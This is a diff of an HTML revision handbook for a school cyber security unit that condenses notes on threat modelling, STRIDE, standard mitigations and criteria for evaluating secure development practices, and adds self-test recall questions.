+    <p>A <b>structured approach to identifying and addressing potential security threats</b> — <b>thinking like an attacker</b> to predict how a system could be exploited, then acting to prevent it. Like a risk management plan for floods or fires, but for hacking, data leaks and unauthorised access.</p>
   </div>
-
+  <h3>1 · Define security requirements</h3>
+  <p>Before writing code, define the protections the software must provide — e.g. <i>"user passwords must be encrypted"</i>, <i>"only verified users can access private data"</i>, <i>"the system must log all failed login attempts"</i>.</p>
+  <p>Requirements should <b>align with laws</b> (e.g. Privacy Act 1988), protect sensitive data, support authentication and authorisation, and be <b>clearly documented from the start</b>. Security not planned from the beginning creates vulnerabilities that are <b>harder and more expensive</b> to fix later.</p>
+  <h3>2 · Identify threats</h3>
+  <p>Ask "what could go wrong?" and "how might someone break or misuse this?"</p>
   <table>
-    <thead><tr><th style="width:12mm">#</th><th style="width:60mm">Principle</th><th>Description</th></tr></thead>
-    <tr><td class="num">1</td><td class="who">Define security requirements</td><td>What protections does the software or system need?</td></tr>
-    <tr><td class="num">2</td><td class="who">Identify threats</td><td>What could go wrong?</td></tr>
-    <tr><td class="num">3</td><td class="who">Mitigate threats</td><td>What can we do to prevent problems?</td></tr>
-    <tr><td class="num">4</td><td class="who">Confirm mitigation</td><td>Are our protections actually working?</td></tr>
-  </table>
-
-  <h3><span class="tag">Principle 1</span>Define security requirements</h3>
-  <p>Before developers start writing code, they must define the <b>security requirements</b> the software must meet — the rules and protections it should follow to remain safe from attacks.</p>
-  <div class="split">
-    <div class="box plain">
-      <div class="lab">What they look like</div>
-      <ul>
-        <li>"User passwords must be encrypted."</li>
-        <li>"Only verified users can access private data."</li>
-        <li>"The system must log all failed login attempts."</li>
-      </ul>
-    </div>
-    <div class="box plain">
-      <div class="lab">They should</div>
-      <ul>
-        <li>Align with laws and regulations (e.g. <b>Privacy Act 1988</b>).</li>
-        <li>Protect sensitive data.</li>
-        <li>Support user authentication and authorisation.</li>
-        <li>Be clearly documented from the start of the project.</li>
-      </ul>
-    </div>
-  </div>
-  <p><b>Why it matters:</b> if security is not planned from the beginning, it can lead to vulnerabilities that are <b>harder and more expensive to fix later</b>.</p>
-
-  <h3><span class="tag">Principle 2</span>Identify threats</h3>
-  <p>Once security requirements are clear, developers identify potential threats, asking "What could go wrong?" or "How might someone try to break or misuse this?"</p>
-  <table>
-    <thead><tr><th style="width:36mm">Threat type</th><th style="width:56mm">Description</th><th>Example</th></tr></thead>
+    <thead><tr><th style="width:26mm">Threat</th><th style="width:38mm">Description</th><th>Example</th></tr></thead>
     <tr><td class="who">Data breach</td><td>Unauthorised access to private data</td><td>Leaking personal information from a database</td></tr>
-    <tr><td class="who">Code injection</td><td>Attacker sends harmful code through inputs</td><td>SQL injection via login form</td></tr>
-    <tr><td class="who">Cross-site scripting</td><td>Attacker injects code into a web page</td><td>Script steals session cookies</td></tr>
+    <tr><td class="who">Code injection</td><td>Harmful code sent through inputs</td><td>SQL injection via a login form</td></tr>
+    <tr><td class="who">XSS</td><td>Code injected into a web page</td><td>Script steals session cookies</td></tr>
     <tr><td class="who">Denial of service</td><td>Overwhelming the system to crash it</td><td>Spamming login to shut down the server</td></tr>
     <tr><td class="who">Man-in-the-middle</td><td>Intercepting communication</td><td>Eavesdropping on unsecured Wi-Fi</td></tr>
   </table>
-  <div class="box plain">
-    <div class="lab">Tools &amp; techniques</div>
-    <ul>
-      <li><b>STRIDE</b> — a model used to classify threats: <b>S</b>poofing, <b>T</b>ampering, <b>R</b>epudiation, <b>I</b>nformation disclosure, <b>D</b>enial of service, <b>E</b>levation of privilege.</li>
-      <li>Security auditing.</li>
-      <li>Threat brainstorming sessions.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Principle 3</span>Mitigate threats</h3>
+  <p><b>Tools:</b> <b>STRIDE</b> classifies threats — <b>S</b>poofing, <b>T</b>ampering, <b>R</b>epudiation, <b>I</b>nformation disclosure, <b>D</b>enial of service, <b>E</b>levation of privilege — plus security auditing and threat brainstorming sessions.</p>
+  <h3>3 · Mitigate threats</h3>
   <table>
-    <thead><tr><th style="width:44mm">Threat</th><th>Mitigation technique</th></tr></thead>
-    <tr><td class="who">SQL injection</td><td>Input validation and prepared statements</td></tr>
-    <tr><td class="who">Data breach</td><td>Encrypt stored data and use secure authentication</td></tr>
+    <tr><td class="who" style="width:30mm">SQL injection</td><td>Input validation and prepared statements</td></tr>
+    <tr><td class="who">Data breach</td><td>Encrypt stored data, secure authentication</td></tr>
     <tr><td class="who">XSS</td><td>Sanitise user input</td></tr>
     <tr><td class="who">DoS attacks</td><td>Rate limiting and traffic filtering</td></tr>
-    <tr><td class="who">Weak passwords</td><td>Enforce strong password policies and multi-factor authentication (MFA)</td></tr>
+    <tr><td class="who">Weak passwords</td><td>Strong password policies and <b>MFA</b></td></tr>
   </table>
-  <div class="box mit">
-    <div class="lab">Additional security practices</div>
-    <ul>
-      <li><b>Penetration testing</b> — simulate real attacks to test defences.</li>
-      <li><b>Secure coding practices</b> — training developers to avoid common vulnerabilities.</li>
-      <li><b>Application security tools</b> (SAST / DAST / IAST) — automatically detect flaws.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Principle 4</span>Confirm threats have been mitigated</h3>
-  <p>After implementing mitigation measures, it's essential to <b>verify</b> that the threats are truly handled, through testing and review:</p>
-  <ul>
-    <li><b>Security testing</b> — manual and automated.</li>
-    <li><b>Code reviews</b> — internal or third-party.</li>
-    <li><b>Regression testing</b> — ensure fixes don't break other parts.</li>
-    <li><b>Audit trails</b> — logging activities to track incidents.</li>
-    <li><b>Compliance testing</b> — checking against legal and policy standards.</li>
-  </ul>
+  <p><b>Also:</b> penetration testing to simulate real attacks · secure coding training · application security tools (<b>SAST / DAST / IAST</b>) to detect flaws automatically.</p>
+  <h3>4 · Confirm mitigation</h3>
+  <p>Verify the threats are genuinely handled through <b>security testing</b> (manual and automated) · <b>code reviews</b> (internal or third-party) · <b>regression testing</b> so fixes don't break other parts · <b>audit trails</b> logging activity to track incidents · <b>compliance testing</b> against legal and policy standards.</p>
   <div class="box plain">
     <div class="lab">Ongoing</div>
     <p>Security is a <b>continuous process, not a one-time fix</b>. New threats emerge regularly, and software must evolve to stay protected.</p>
   </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Name the four principles and the question each answers.</li>
-      <li>Expand STRIDE and give an example threat for three of its letters.</li>
-      <li>Give the mitigation for each of the five threat types.</li>
-      <li>Why is regression testing part of confirming mitigation?</li>
-    </ol>
-  </div>
 </section>
 
-<!-- ═══════════════ W4 L3 ═══════════════ -->
 <section class="lesson">
-  <h2><span class="wk">Week 4 · Lesson 3</span>Evaluating the Security of Development Practices</h2>
-  <p class="intro">Criteria for assessing how securely an organisation builds and maintains software — from risk evaluation through to incident response and compliance. This is the lesson to lean on for extended-response questions.</p>
-
-  <p>Security in software development is not just a technical consideration — it's essential to protecting an organisation's data, users and reputation. As cyber threats become more advanced, organisations must evaluate how securely they build and maintain software across the <b>entire development lifecycle</b>, from planning to deployment and beyond. Security should be treated as a <b>shared responsibility</b> by everyone involved.</p>
-  <p>Organisations use <b>evaluation criteria</b> to identify strengths, weaknesses and areas for improvement. These help decision-makers understand whether current practices meet industry standards, comply with regulations, and are effective against real-world threats. Evaluation should be built into the development cycle, with regular reviews as new threats and technologies emerge.</p>
-
-  <h3><span class="tag">Criterion 1</span>Identifying &amp; assessing risk</h3>
-  <p>Risk management is the foundation. It begins by identifying potential threats — anything that could cause harm to systems, data or people. Common threats include unauthorised access, data loss, system failures and cyber attacks. Each must be analysed in terms of <b>likelihood and potential impact</b>.</p>
-  <p>Once threats are identified, evaluate how <b>acceptable</b> the risks are. Some may be low in both likelihood and impact; others could be critical and require immediate action. The goal is <b>not to eliminate all risks</b>, which is usually impossible, but to reduce them to an acceptable level through smart, practical decisions.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Has the organisation identified all relevant threats to its software and systems?</li>
-      <li>Are risks evaluated in terms of both likelihood and consequences?</li>
-      <li>Are mitigation strategies in place and reviewed regularly for effectiveness?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 2</span>Evaluating security controls</h3>
-  <p>Security controls are the tools and practices used to protect data and systems — <b>authentication</b> (verifying identity), <b>authorisation</b> (granting the right access), <b>encryption</b> (protecting data), and <b>access control</b> (restricting who can do what). Evaluation must assess whether these are properly implemented and strong enough against known threats.</p>
-  <p>Effective evaluation means checking not just that controls <b>exist</b>, but that they are actively maintained, tested and updated. A system with outdated security controls or default passwords is <b>just as vulnerable as one with no controls at all</b>. Controls must also be balanced — too few create risk, but overly strict controls can block legitimate users or interfere with performance.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Are authentication and access control mechanisms properly configured?</li>
-      <li>Is sensitive data encrypted during storage and transmission?</li>
-      <li>Are controls monitored and updated in response to evolving threats?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 3</span>Reviewing secure development practices</h3>
-  <p>Security must be embedded in the way code is written and maintained — <b>input validation</b> (to prevent injection attacks), <b>proper error handling</b> (to avoid exposing sensitive system details), and regular <b>code reviews</b>. Developers should also follow principles such as <b>least privilege</b> and <b>fail-safe defaults</b>.</p>
-  <p>Evaluating practices involves checking whether developers are <b>consistently applying</b> these principles. If a team lacks training in secure coding or skips critical security steps under pressure, vulnerabilities are more likely to slip through. Strong policies, training and automated tools help enforce standards throughout the lifecycle.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Are developers trained in secure coding principles?</li>
-      <li>Are best practices such as input validation and error handling consistently followed?</li>
-      <li>Are secure defaults and access restrictions implemented in the code?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 4</span>Conducting security testing</h3>
-  <p>Security testing verifies that software is not only functioning but also protected from attack — automated tools such as vulnerability scanners, and manual processes like <b>penetration testing</b>, which simulate real-world attacks to see how the system responds and where weaknesses lie.</p>
-  <p>Testing should be performed regularly, <b>especially after updates or changes</b>. It's important to test both internally developed features and third-party components. A thorough process ensures vulnerabilities are caught before exploitation and that developers receive feedback to improve future work.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Are vulnerability scans and penetration tests conducted regularly?</li>
-      <li>Are security tests included in continuous integration and deployment pipelines?</li>
-      <li>Are testing results used to guide improvements to code and architecture?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 5</span>Reviewing third-party components</h3>
-  <p>Most modern software relies on third-party tools — libraries, APIs, SDKs and external services. While these speed up development, vulnerabilities in third-party code can be exploited just like flaws in your own code, and many attacks target known issues in widely used components.</p>
-  <p>Evaluating third-party risk involves identifying all external components and assessing their security — checking <b>update history, security patches, licensing terms and community support</b>. Organisations should also use <b>SCA</b> tools to automate this review.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Are all third-party tools and libraries documented and tracked?</li>
-      <li>Are external components regularly reviewed for known vulnerabilities?</li>
-      <li>Are licensing and compliance issues considered before use?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 6</span>Security awareness &amp; culture</h3>
-  <p>Technology alone can't secure a system — <b>people are just as important</b>. Security awareness means ensuring all team members understand their responsibilities and best practices. Developers, testers, managers and even end users must be trained to spot suspicious activity and protect sensitive data.</p>
-  <p>Evaluating culture means reviewing training programs, communication practices, and the overall approach to security. A strong culture supports proactive behaviour; a weak one leads to mistakes, oversights or non-compliance.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Do all team members receive regular security training?</li>
-      <li>Is there a shared understanding of secure development responsibilities?</li>
-      <li>Is security treated as a priority at every level of the organisation?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 7</span>Incident response readiness</h3>
-  <p>No matter how good your security is, incidents can still happen. What matters is <b>how quickly and effectively</b> the organisation responds. An incident response plan outlines what to do when a breach occurs — who is notified, how systems are isolated, how data is recovered, and how communication is managed.</p>
-  <p>Evaluating readiness involves reviewing whether plans exist, are up to date, and are regularly tested. It also includes assessing how well the organisation can <b>detect unusual behaviour</b> and how fast it can act to limit damage.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Is there a documented and tested incident response plan?</li>
-      <li>Are roles and responsibilities clearly defined in the event of a breach?</li>
-      <li>Are incidents reviewed afterwards to improve the response process?</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Criterion 8</span>Compliance &amp; continuous improvement</h3>
-  <p>Security strategies must align with legal and industry standards — the <b>Privacy Act 1988</b>, the <b>Privacy and Data Protection Act 2014</b> (Vic), or ACSC guidelines. Compliance ensures organisations avoid legal penalties and uphold user trust.</p>
-  <p>But security isn't just a checklist. <b>Continuous improvement</b> means regularly reviewing processes, updating tools, and staying informed about new threats — a proactive approach that keeps the organisation ahead in an ever-changing landscape.</p>
-  <div class="box plain">
-    <div class="lab">Ask</div>
-    <ul>
-      <li>Are the software practices compliant with relevant laws and standards?</li>
-      <li>Are security strategies reviewed and improved over time?</li>
-      <li>Is feedback from incidents and audits used to enhance future security?</li>
-    </ul>
-  </div>
-
+  <h2><span class="wk">Week 4 · Lesson 3</span>Evaluating Development Security</h2>
+  <p>Organisations must evaluate how securely they build and maintain software across the <b>entire lifecycle</b>. Evaluation criteria identify strengths, weaknesses and areas for improvement — whether practices meet industry standards, comply with regulations, and work against real threats. Security is a <b>shared responsibility</b>; evaluation is built into the development cycle and repeated as threats evolve.</p>
+  <table class="long">
+    <thead><tr><th style="width:26mm">Criterion</th><th>What it covers · what to ask</th></tr></thead>
+    <tr>
+      <td class="who">Identifying &amp; assessing risk</td>
+      <td>The foundation. Identify anything that could harm systems, data or people — unauthorised access, data loss, system failure, attacks — and analyse each for <b>likelihood and impact</b>. The goal is <b>not zero risk</b> (usually impossible) but reducing risk to an <b>acceptable level</b>. <span style="color:var(--teal)"><b>Ask:</b></span> Are all relevant threats identified? Are risks evaluated for both likelihood and consequences? Are mitigations in place and reviewed regularly for effectiveness?</td>
+    </tr>
+    <tr>
+      <td class="who">Security controls</td>
+      <td><b>Authentication</b> (verifying identity), <b>authorisation</b> (right access), <b>encryption</b> and <b>access control</b>. Check not just that controls exist but that they're maintained, tested and updated — outdated controls or default passwords are <b>as vulnerable as no controls</b>. Overly strict controls block legitimate users. <span style="color:var(--teal)"><b>Ask:</b></span> Are authentication and access control properly configured? Is sensitive data encrypted during storage and transmission? Are controls monitored and updated as threats evolve?</td>
+    </tr>
+    <tr>
+      <td class="who">Secure development practices</td>
+      <td>Security embedded in how code is written — input validation (prevents injection), proper error handling (avoids exposing system details), regular code reviews, and principles such as <b>least privilege</b> and <b>fail-safe defaults</b>. Teams without training, or skipping steps under pressure, let vulnerabilities through. <span style="color:var(--teal)"><b>Ask:</b></span> Are developers trained in secure coding? Are input validation and error handling consistently followed? Are secure defaults and access restrictions implemented in the code?</td>
+    </tr>
+    <tr>
+      <td class="who">Security testing</td>
+      <td>Verifies software is protected, not just functional — vulnerability scanners plus manual <b>penetration testing</b> simulating real attacks. Test after every update or change, covering both internal features and third-party components. <span style="color:var(--teal)"><b>Ask:</b></span> Are vulnerability scans and penetration tests conducted regularly? Are security tests in the CI/CD pipeline? Are results used to improve code and architecture?</td>
+    </tr>
+    <tr>
+      <td class="who">Third-party components</td>
+      <td>Most software relies on libraries, APIs, SDKs and external services. Identify every external component and assess <b>update history, patches, licensing terms and community support</b>; automate the review with <b>SCA</b>. <span style="color:var(--teal)"><b>Ask:</b></span> Are all third-party tools and libraries documented and tracked? Are they regularly reviewed for known vulnerabilities? Are licensing and compliance issues considered before use?</td>
+    </tr>
+    <tr>
+      <td class="who">Awareness &amp; culture</td>
+      <td>Technology alone can't secure a system — developers, testers, managers and end users must all be trained to spot suspicious activity and protect data. A strong culture supports proactive behaviour; a weak one leads to mistakes and non-compliance. <span style="color:var(--teal)"><b>Ask:</b></span> Do all team members receive regular security training? Is there a shared understanding of secure development responsibilities? Is security a priority at every level?</td>
+    </tr>
+    <tr>
+      <td class="who">Incident response readiness</td>
+      <td>Incidents happen regardless; what matters is <b>how fast and effectively</b> the organisation responds. A plan covers who is notified, how systems are isolated, how data is recovered, and how communication is managed — and must be kept current and tested. <span style="color:var(--teal)"><b>Ask:</b></span> Is there a documented and tested incident response plan? Are roles and responsibilities clearly defined? Are incidents reviewed afterwards to improve the process?</td>
+    </tr>
+    <tr>
+      <td class="who">Compliance &amp; continuous improvement</td>
+      <td>Align with the <b>Privacy Act 1988</b>, the <b>PDP Act 2014</b> and ACSC guidance to avoid penalties and uphold trust. But security isn't a checklist — <b>continuous improvement</b> means reviewing processes, updating tools and tracking new threats. <span style="color:var(--teal)"><b>Ask:</b></span> Are practices compliant with relevant laws and standards? Are security strategies reviewed and improved over time? Is feedback from incidents and audits used?</td>
+    </tr>
+  </table>
   <div class="box mit">
-    <div class="lab">Answer structure for extended response</div>
+    <div class="lab">Extended-response structure</div>
     <ol>
       <li><b>Name the criterion</b> you're evaluating against.</li>
-      <li><b>State the evidence</b> from the case study or scenario.</li>
+      <li><b>State the evidence</b> from the case study.</li>
       <li><b>Judge it against the standard</b> — a framework (Essential Eight, ISM, OWASP), an Act, or best practice.</li>
-      <li><b>Recommend the specific control</b> that closes the gap.</li>
-      <li><b>Say how you'd confirm</b> it worked (testing, audit, review).</li>
-    </ol>
-  </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>List all eight criteria areas from memory.</li>
-      <li>Why is a system with default passwords "as vulnerable as one with no controls at all"?</li>
-      <li>Why is the goal not to eliminate all risk?</li>
-      <li>Take any case study from Week 2 Lesson 1 and write a five-step evaluation of it using the structure above.</li>
+      <li><b>Recommend the control</b> that closes the gap.</li>
+      <li><b>Say how you'd confirm</b> it worked — testing, audit, review.</li>
     </ol>
   </div>
 </section>
 
+<section class="lesson">
+  <h2><span class="wk">Self-testing</span>Recall Prompts</h2>
+  <p>Cover the notes and work through these. If one stalls, that's the section to reread.</p>
+  <div class="recall">
+    <div class="lab">Week 1</div>
+    <ol>
+      <li>Four software types with an example of each; goals vs objectives.</li>
+      <li>List the Essential Eight in order. Which three keep software current?</li>
+      <li>The three ISM guidelines, and the difference between SAST and DAST.</li>
+      <li>The ACS core values, and the five ethical issues with an example each.</li>
+    </ol>
+  </div>
+  <div class="recall">
+    <div class="lab">Week 2</div>
+    <ol>
+      <li>Match each case study to its vulnerability: Optus · Toll · Accellion · ANU · Service NSW · SolarWinds.</li>
+      <li>Which two case studies had phishing as the entry point?</li>
+      <li>Name all seven MitM techniques and one mitigation for each.</li>
+      <li>Why is the payer usually liable in an invoice scam?</li>
+      <li>The six social engineering types; how does pretexting differ from baiting?</li>
+      <li>Three key differences between security awareness and incident response training.</li>
+      <li>Why does stored XSS spread like a worm? Why do parameterised statements fix both forms of SQL injection?</li>
+      <li>Which Act covers a state school? A $5M-turnover company? A hospital's medical records?</li>
+      <li>State APP 11 and IPP 4. Which APP and IPP cover data leaving the country?</li>
+      <li>The four steps of risk management, applied to "delayed patching".</li>
+    </ol>
+  </div>
+  <div class="recall">
+    <div class="lab">Weeks 3–4</div>
+    <ol>
+      <li>Three characteristics of secure information, and the Act requiring confidentiality.</li>
+      <li>The 3-2-1 rule, the 3-2-1-1 variation, and the three ML3 backup requirements.</li>
+      <li>Why "delete" doesn't destroy data; the four sanitisation methods; PROV's three authorities.</li>
+      <li>The six security controls and why each matters.</li>
+      <li>Three advantages and three disadvantages of each development approach.</li>
+      <li>The four third-party risks, and the four things an SCA tool does.</li>
+      <li>The four threat modelling principles and the question each answers; expand STRIDE.</li>
+      <li>All eight evaluation criteria. Why is the goal not to eliminate all risk?</li>
+      <li>Take any Week 2 case study and write a five-step evaluation of it.</li>
+    </ol>
+  </div>
+</section>
+
+</div><!-- /.flow -->
 <footer class="foot">
-  <span>Software Development · Unit 4 · Cyber Security · Weeks 1–4 · Revision handbook</span>
+  <span>Software Development · Unit 4 · Cyber Security · Weeks 1–4 · Condensed revision</span>
   <span class="r">Companion to the one-sheet SAC poster</span>
 </footer>
-</div>
+</div><!-- /.wrap -->
 </body>
 </html>
